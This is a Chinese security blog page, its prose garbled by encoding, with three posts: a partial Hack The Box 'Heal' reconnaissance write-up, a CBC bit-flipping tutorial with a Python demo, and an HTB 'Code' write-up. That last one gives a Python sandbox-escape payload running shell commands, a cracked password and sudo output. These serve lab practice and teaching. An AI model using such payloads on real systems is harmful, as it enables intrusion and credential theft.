              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-05-05 17:20:58 / ä¿®æ”¹æ—¶é—´ï¼š20:56:24" itemprop="dateCreated datePublished" datetime="2025-05-05T17:20:58+08:00">2025-05-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="å¼€æ”¾ç«¯å£"><a href="#å¼€æ”¾ç«¯å£" class="headerlink" title="å¼€æ”¾ç«¯å£"></a>å¼€æ”¾ç«¯å£</h3><p><code>nmap 10.10.11.46 -sV -A</code> å¾—åˆ° å¼€æ”¾äº†22 80  ç«¯å£</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</span><br><span class="line">â””â”€$ nmap 10.10.11.46  -sV -A</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 04:26 EDT</span><br><span class="line">Nmap scan report for heal.htb (10.10.11.46)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)</span><br><span class="line">|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Heal</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 8888/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   260.48 ms 10.10.14.1</span><br><span class="line">2   198.07 ms heal.htb (10.10.11.46)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 92.43 seconds</span><br></pre></td></tr></table></figure>

<h3 id="æ·»åŠ åˆ°Hosts"><a href="#æ·»åŠ åˆ°Hosts" class="headerlink" title="æ·»åŠ åˆ°Hosts"></a>æ·»åŠ åˆ°Hosts</h3><p>echo â€œ10.10.11.46 heal.htbâ€ | sudo tee -a &#x2F;etc&#x2F;hosts</p>
<p>è®¿é—®hrrp:&#x2F;&#x2F;10.10.11.46å³å¯</p>
<h3 id="æ‰«æå­åŸŸå"><a href="#æ‰«æå­åŸŸå" class="headerlink" title="æ‰«æå­åŸŸå"></a>æ‰«æå­åŸŸå</h3><p>ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u <a target="_blank" rel="noopener" href="http://heal.htb/">http://heal.htb/</a> -H â€œHost:FUZZ.heal.htbâ€ -fc 301</p>
<p>æ‰«æåˆ°api.heal.htb ï¼ˆè®°å¾—ä¹Ÿè¦æ·»åŠ åˆ°hostsé‡Œé¢å“¦~</p>
<p>è®¿é—®å¾—åˆ° çœ‹ç½‘ç«™æ ‡ç­¾æ˜¯ruby æš‚æ—¶æ²¡ç”¨</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250505164357452.png" alt="image-20250505164357452"></p>
<h3 id="è®¿é—®heal-htb"><a href="#è®¿é—®heal-htb" class="headerlink" title="è®¿é—®heal.htb"></a>è®¿é—®heal.htb</h3><p>è¿›å»æ˜¯ç™»å½•æ¡†å’Œæ³¨å†Œ å…ˆæ³¨å†Œ è¿™é‡Œæ³¨å†Œåˆ«éšæ„æ³¨å†Œ ä¸ç„¶ä¼šæŠ¥é”™ æœ€åæ‰¾ä¸ªå¤–å›½äººæ³¨å†Œçš„æ ¼å¼ï¼ˆè¿˜æŒºä»¿çœŸ</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Full Name: Ethan Williams</span><br><span class="line">Email: ethan.williams24@mailservice.com</span><br><span class="line">Username: ethanw24</span><br><span class="line">Password: sunny2024</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250505170108355.png" alt="image-20250505170108355"></p>
<p>å¯ä»¥å‘ç°ä¸‰ä¸ªè·¯ç”±åˆ†åˆ«æ˜¯ &#x2F;resume &#x2F;survey &#x2F;profile</p>
<p>åœ¨profileå‘ç°è‡ªå·±çš„IDä¸æ˜¯1 å¹¶ä¸”ç›´æ¥è¯´æˆ‘ä¸æ˜¯admin </p>
<p>åœ¨surveyå‘ç°è·³è½¬<a target="_blank" rel="noopener" href="http://take-survey.heal.htb/">http://take-survey.heal.htb</a> æ— æ³•è®¿é—® æ·»åŠ åˆ°hosts</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250505171245061.png" alt="image-20250505171245061"></p>
<p>åœ¨<a target="_blank" rel="noopener" href="http://take-survey.heal.htb/index.php/">http://take-survey.heal.htb/index.php/</a> å‘ç°å¸å· Administrator (<a href="mailto:&#x72;&#x61;&#108;&#x70;&#104;&#x40;&#104;&#x65;&#x61;&#x6c;&#46;&#x68;&#116;&#x62;">ralph@heal.htb</a> )</p>
<p>æ‰«æ dirsearch -u â€œ<a target="_blank" rel="noopener" href="http://take-survey.heal.htb/index.php/">http://take-survey.heal.htb/index.php/</a>â€œ -i 200      ï¼ˆå› ä¸ºè¿™é‡Œ503å¤ªå¤šäº†å½±å“çœ‹</p>
<h2 id="æ¸—é€é¶æœº"><a href="#æ¸—é€é¶æœº" class="headerlink" title="æ¸—é€é¶æœº"></a>æ¸—é€é¶æœº</h2><p>é¦–å…ˆæ˜¯æœ€åˆçš„heal.htbæœ‰å¯¼å‡ºpdfåŠŸèƒ½ æŠ“åŒ…å‘ç°æœ‰ä¸€ä¸ªdonwloadè·¯ç”±</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-04-27 12:25:58 / ä¿®æ”¹æ—¶é—´ï¼š12:25:56" itemprop="dateCreated datePublished" datetime="2025-04-27T12:25:58+08:00">2025-04-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CBCåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹"><a href="#CBCåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹" class="headerlink" title="CBCåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹"></a>CBCåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹</h2><p><img src="/images/f215609f354300598724de6ef2aeb364.png" alt="f215609f354300598724de6ef2aeb364"></p>
<h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p><strong>CBCåŠ å¯†æµç¨‹ï¼š</strong></p>
<ol>
<li><p><strong>å‡†å¤‡</strong></p>
<ul>
<li>å°†æ˜æ–‡æŒ‰å›ºå®šé•¿åº¦ï¼ˆé€šå¸¸æ˜¯å—å¤§å°ï¼Œæ¯”å¦‚AESæ˜¯128ä½ï¼‰<strong>åˆ†å—</strong>ã€‚</li>
<li>å¦‚æœæœ€åä¸€å—ä¸è¶³é•¿åº¦ï¼Œéœ€è¦<strong>å¡«å……ï¼ˆpaddingï¼‰</strong>ã€‚</li>
<li>é€‰ä¸€ä¸ª<strong>åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰</strong>ï¼Œå®ƒçš„é•¿åº¦è·Ÿåˆ†å—å¤§å°ç›¸åŒã€‚</li>
</ul>
</li>
<li><p><strong>åŠ å¯†æ¯ä¸€å—ï¼ˆç¬¬ i å—ï¼‰</strong></p>
<ul>
<li><p><strong>ç¬¬1æ­¥</strong>ï¼šç”¨å½“å‰æ˜æ–‡å— PiP_iPi å’Œå‰ä¸€å—å¯†æ–‡ï¼ˆæˆ–IVï¼‰åš<strong>å¼‚æˆ–ï¼ˆXORï¼‰</strong>ã€‚</p>
<ul>
<li>ç¬¬ä¸€ä¸ªå—æ˜¯<br>$$<br>C_0&#x3D;Ek(P0âŠ•IV)<br>$$</li>
</ul>
</li>
<li><p><strong>ç¬¬2æ­¥</strong>ï¼šå°†å¼‚æˆ–åçš„ç»“æœé€å…¥<strong>åŠ å¯†ç®—æ³•ï¼ˆE_kï¼‰</strong>ï¼ˆæ¯”å¦‚AESï¼‰åŠ å¯†ï¼Œå¾—åˆ°å½“å‰å—çš„å¯†æ–‡ Ciã€‚</p>
</li>
<li><p><strong>ç¬¬3æ­¥</strong>ï¼šå½“å‰çš„å¯†æ–‡å— CiC_iCi ä¼šä½œä¸ºä¸‹ä¸€å—æ˜æ–‡çš„XORå¯¹è±¡ã€‚</p>
</li>
</ul>
</li>
<li><p><strong>å¾ªç¯å¤„ç†</strong>æ¯ä¸€å—ï¼Œç›´åˆ°å…¨éƒ¨åŠ å¯†å®Œæˆã€‚</p>
</li>
</ol>
<h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§£å¯†è¿‡ç¨‹åˆšå¥½ç›¸åï¼Œç¬¬ä¸€ç»„å¯†æ–‡åœ¨è§£å¯†ä¹‹åä¸åˆå§‹å‘é‡IVå¼‚æˆ–å¾—åˆ°ç¬¬ä¸€ç»„æ˜æ–‡ã€‚ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ä¹‹åå’Œç¬¬ä¸€ç»„å¯†æ–‡å¼‚æˆ–å¾—åˆ°ç¬¬äºŒç»„æ˜æ–‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè§£å¯†ä¸€ç»„æ˜æ–‡éœ€è¦æœ¬ç»„å’Œå‰ä¸€ç»„çš„å¯†æ–‡ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h3><p>åŠ å¯†ç®—æ³•çš„è¾“å…¥æ˜¯ä¸Šä¸€ä¸ªå¯†æ–‡åˆ†ç»„å’Œä¸‹ä¸€ä¸ªæ˜æ–‡åˆ†ç»„çš„å¼‚æˆ–</p>
<h3 id="EXBæ¨¡å¼å’ŒCBCæ¨¡å¼"><a href="#EXBæ¨¡å¼å’ŒCBCæ¨¡å¼" class="headerlink" title="EXBæ¨¡å¼å’ŒCBCæ¨¡å¼"></a>EXBæ¨¡å¼å’ŒCBCæ¨¡å¼</h3><p><img src="/images/image-20250426204537824.png" alt="image-20250426204537824"></p>
<h3 id="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»"><a href="#CBCå­—èŠ‚ç¿»è½¬æ”»å‡»" class="headerlink" title="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»"></a>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</h3><p>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„æ ¸å¿ƒåŸç†æ˜¯é€šè¿‡ç ´åä¸€ä¸ªæ¯”ç‰¹çš„å¯†æ–‡æ¥ç¯¡æ”¹ä¸€ä¸ªæ¯”ç‰¹çš„æ˜æ–‡ã€‚</p>
<p><img src="/images/erwerwerwerwe.png" alt="erwerwerwerwe"><br>$$<br>ç”±é¢˜ç›®å¾— AâŠ•B&#x3D;C<br>$$<br>å¦‚æœæˆ‘ä»¬æƒ³è¦æ”¹å˜è¾“å‡ºçš„æ˜æ–‡C é‚£æˆ‘ä»¬åªéœ€è¦æ”¹å˜ç§˜é’¥A</p>
<p>ä»¤æ”¹å˜åçš„Aä¸ºAâ€™ Cä¸ºCâ€™ï¼Œäºæ˜¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C&#x27;=CâŠ•CâŠ•C&#x27;</span><br><span class="line">  =AâŠ•BâŠ•CâŠ•C&#x27;</span><br><span class="line">  =BâŠ•AâŠ•CâŠ•C&#x27;</span><br><span class="line">ä»¤A&#x27;=AâŠ•CâŠ•C&#x27;</span><br><span class="line">--&gt;C&#x27;=BâŠ•A&#x27;--&gt;A&#x27;âŠ•B=C&#x27; ç¿»è½¬æˆåŠŸå•¦ï¼</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æŠŠAæ”¹ä¸ºAâ€™&#x3D;AâŠ•CâŠ•Câ€™ æˆ‘ä»¬å°±å¯ä»¥å®ç°è¿™ä¸ªå­—èŠ‚ç¿»è½¬æ”»å‡»</p>
<h3 id="æµ‹è¯•æ”»å‡»æ¨¡æ‹Ÿä»£ç "><a href="#æµ‹è¯•æ”»å‡»æ¨¡æ‹Ÿä»£ç " class="headerlink" title="æµ‹è¯•æ”»å‡»æ¨¡æ‹Ÿä»£ç "></a>æµ‹è¯•æ”»å‡»æ¨¡æ‹Ÿä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">BS = AES.block_size  <span class="comment"># åˆ†ç»„é•¿åº¦</span></span><br><span class="line">key = <span class="string">b&#x27;test&#x27;</span>  <span class="comment"># å¯†é’¥</span></span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span>  <span class="comment"># éšæœºåˆå§‹å‘é‡</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()  <span class="comment"># Pkcs5Padding</span></span><br><span class="line">data = <span class="string">b&#x27;1234567890abcdefabcdef1234567890&#x27;</span>  <span class="comment"># æ˜æ–‡M</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">data</span>):</span><br><span class="line">    aes = AES.new(pad(key), AES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = aes.encrypt(pad(data))</span><br><span class="line">    ciphertext = binascii.b2a_hex(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">c</span>):</span><br><span class="line">    c = binascii.a2b_hex(c)</span><br><span class="line">    aes = AES.new(pad(key), AES.MODE_CBC, iv)</span><br><span class="line">    data = aes.decrypt(c)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•CBCç¿»è½¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CBC_test</span>(<span class="params">c</span>):</span><br><span class="line">    c = <span class="built_in">bytearray</span>(binascii.a2b_hex(c))</span><br><span class="line">    c[<span class="number">0</span>] = c[<span class="number">0</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)  <span class="comment"># c[0]ä¸ºç¬¬ä¸€ç»„çš„å¯†æ–‡å­—ç¬¦ï¼Œaä¸ºç¬¬äºŒç»„ç›¸åº”ä½ç½®çš„æ˜æ–‡å­—ç¬¦ï¼ŒAæ˜¯æˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡å­—ç¬¦ è¿™ä¸€æ­¥å°±æ˜¯åœ¨åš A&#x27;=AâŠ•CâŠ•C&#x27;</span></span><br><span class="line">    c = binascii.b2a_hex(c)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ciphertext:&quot;</span>, enc(data))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;data:&quot;</span>, dec(enc(data)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CBC Attack:&quot;</span>, dec(CBC_test(enc(data))))</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ciphertext: b&#x27;65518dfe77f7d677134f341c5b00c1674e7a87b231f852b63d35ee69dc60bcc7c5b7325b590c00d089b6ad312f21b043&#x27;</span><br><span class="line">data: b&#x27;1234567890abcdefabcdef1234567890\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span><br><span class="line">CBC Attack: b&#x27;\xfe\xb4\x11n+\x1a\xb7\x90\x9c\x86TPvS\xd4\x9cAbcdef1234567890\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ä¹‹åå·²ç»è¢«æˆ‘ä»¬æ›´æ”¹æˆäº†Aï¼Œè€Œç”±äºæˆ‘ä»¬æ›´æ”¹äº†ç¬¬ä¸€ç»„çš„å¯†æ–‡ï¼Œæ‰€ä»¥ç¬¬ä¸€ç»„è§£å¯†çš„æ˜æ–‡å˜æˆäº†ä¹±ç ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦æ›´æ”¹ç¬¬ä¸€ç»„çš„æ˜æ–‡ï¼Œåˆ™éœ€è¦ä¿®æ”¹åˆå§‹å‘é‡IVçš„å€¼ã€‚</p>
<p>äºæ˜¯è¾¾åˆ°ä¿®æ”¹æ˜æ–‡çš„å†…å®¹çš„ç›®çš„ï¼šè§£å¯†å‡ºæ¥çš„å†…å®¹å°±ä¼šæŠŠ <code>&#39;a&#39;</code> æ”¹æˆ <code>&#39;A&#39;</code></p>
<h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="bugku-login4"><a href="#bugku-login4" class="headerlink" title="bugku-login4"></a><em><strong>bugku-login4</strong></em></h4><p>é¢˜è§£é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://cltheorem.github.io/2019/03/bugku-login/">https://cltheorem.github.io/2019/03/bugku-login/</a></p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é€šè¿‡CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œå‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿè§¦å‘åŠ è§£å¯†è¿‡ç¨‹ï¼Œå¹¶ä¸”èƒ½å¤Ÿè·å¾—æ¯æ¬¡åŠ å¯†åçš„å¯†æ–‡ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ä¸çŸ¥é“keyçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¿®æ”¹å¯†æ–‡æˆ–IVï¼Œæ¥æ§åˆ¶è¾“å‡ºæ˜æ–‡ä¸ºè‡ªå·±æƒ³è¦çš„å†…å®¹ï¼Œè€Œä¸”åªèƒ½ä»æœ€åä¸€ç»„å¼€å§‹ä¿®æ”¹ï¼Œå¹¶ä¸”æ¯æ”¹å®Œä¸€ç»„ï¼Œéƒ½éœ€è¦é‡æ–°è·å–ä¸€æ¬¡è§£å¯†åçš„æ•°æ®ï¼Œè¦æ ¹æ®è§£å¯†åçš„æ•°æ®æ¥ä¿®æ”¹å‰ä¸€ç»„å¯†æ–‡çš„å€¼ã€‚</p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/XL115715453/article/details/102442024?spm=1001.2014.3001.5506">https://blog.csdn.net/XL115715453/article/details/102442024?spm=1001.2014.3001.5506</a></p>
<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/XiongSiqi_blog/article/details/131925246">https://blog.csdn.net/XiongSiqi_blog/article/details/131925246</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/24/HTB-Practice/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/24/HTB-Practice/" class="post-title-link" itemprop="url">HTB-Code</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-04-24 17:20:58 / ä¿®æ”¹æ—¶é—´ï¼š17:41:59" itemprop="dateCreated datePublished" datetime="2025-04-24T17:20:58+08:00">2025-04-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="HTB-code"><a href="#HTB-code" class="headerlink" title="HTB-code"></a>HTB-code</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>nmapæ‰«æ <code>nmap 10.10.11.62 -sV -A</code></p>
<p>å‘ç°å¼€æ”¾äº†5000ç«¯å£ è®¿é—®å‘ç°æ˜¯ä¸ªåœ¨çº¿æ‰§è¡Œpythonä»£ç çš„ç½‘é¡µ</p>
<p>å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p><code>print(&#39;&#39;.__class__.__base__.__subclasses__()[317](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip())</code></p>
<p>ç„¶åç›´æ¥åœ¨ä¸Šå±‚ç›®å½•è¯»åˆ°user.txt</p>
<p><code>print(&#39;&#39;.__class__.__base__.__subclasses__()[317](&#39;cat ../user.txt&#39;,shell=True,stdout=-1).communicate()[0].strip())</code></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">317</span>](<span class="string">&#x27;ls *&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip())</span><br><span class="line"><span class="comment">#b&#x27;app.pyinstance:\ndatabase.db\n\n__pycache__:\napp.cpython-38.pyc\n\nstatic:\ncss\n\ntemplates:\nabout.html\ncodes.html\nindex.html\nlogin.html\nregister.html&#x27; </span></span><br><span class="line">å‘ç°æœ‰instanceä¸‹æœ‰database.db è¯»ä¸€ä¸‹è¯•è¯•çœ‹</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯å¯ä»¥æ‹¿åˆ° martinçš„hashåŠ å¯†åçš„å¯†ç   <code>3de6f30c4a09c27fc71932bfc68474be</code> å°±æ˜¯ <code>nafeelswordsmaster</code></p>
<p>ç„¶åä½¿ç”¨sshç™»å½• ssh <a href="mailto:&#x6d;&#x61;&#x72;&#x74;&#x69;&#110;&#x40;&#x31;&#48;&#x2e;&#x31;&#x30;&#46;&#x31;&#x31;&#x2e;&#54;&#50;">martin@10.10.11.62</a> æç¤ºè¾“å…¥å¯†ç  è¾“å…¥å°±å¥½äº†</p>
<p>è¾“å…¥<code>sudo -l</code> å›æ˜¾ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">martin@code:~$ sudo -l</span><br><span class="line">Matching Defaults entries for martin on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User martin may run the following commands on localhost:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</span><br></pre></td></tr></table></figure>

<p>backy.shæ–‡ä»¶å†…å®¹ï¼š</p>
